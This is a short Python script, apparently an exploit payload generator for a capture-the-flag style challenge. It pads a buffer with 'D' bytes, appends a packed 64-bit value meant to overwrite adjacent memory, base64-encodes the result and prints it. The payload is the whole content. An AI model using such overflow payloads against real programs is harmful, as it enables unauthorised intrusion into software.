
import sys
import struct
import base64

buf = b'DDDDDDDDDDDDDDDDDDDDDDDDD'
buf += struct.pack('<Q', 6292621063413828033)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
